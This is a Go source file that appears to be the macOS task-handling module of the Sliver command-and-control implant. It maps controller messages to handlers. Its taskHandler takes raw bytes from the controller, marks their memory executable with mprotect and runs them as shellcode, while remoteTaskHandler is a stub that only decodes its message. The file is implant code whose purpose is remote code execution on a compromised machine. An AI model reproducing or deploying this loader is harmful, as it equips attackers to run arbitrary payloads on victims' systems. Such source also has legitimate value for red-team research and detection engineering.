package main

import (
	// {{if .Debug}}
	"log"
	// {{else}}
	// {{end}}

	pb "sliver/protobuf"
	"syscall"
	"unsafe"

	"github.com/golang/protobuf/proto"
)

var (
	darwinHandlers = map[string]interface{}{
		"task":       taskHandler,
		"remoteTask": remoteTaskHandler,
		"psReq":      psHandler,
		"ping":       pingHandler,
		"kill":       killHandler,
	}
)

func getSystemHandlers() map[string]interface{} {
	return darwinHandlers
}

// Adapted/stolen from: https://github.com/lesnuages/hershell/blob/master/shell/shell_default.go#L48
func taskHandler(send chan *pb.Envelope, data []byte) {
	dataAddr := uintptr(unsafe.Pointer(&data[0]))
	page := getPage(dataAddr)
	syscall.Mprotect(page, syscall.PROT_READ|syscall.PROT_EXEC)
	dataPtr := unsafe.Pointer(&data)
	funcPtr := *(*func())(unsafe.Pointer(&dataPtr))
	go funcPtr()
}

// Get the page containing the given pointer
// as a byte slice.
func getPage(p uintptr) []byte {
	return (*(*[0xFFFFFF]byte)(unsafe.Pointer(p & ^uintptr(syscall.Getpagesize()-1))))[:syscall.Getpagesize()]
}

func remoteTaskHandler(send chan *pb.Envelope, data []byte) {
	remoteTask := &pb.RemoteTask{}
	err := proto.Unmarshal(data, remoteTask)
	if err != nil {
		// {{if .Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
}
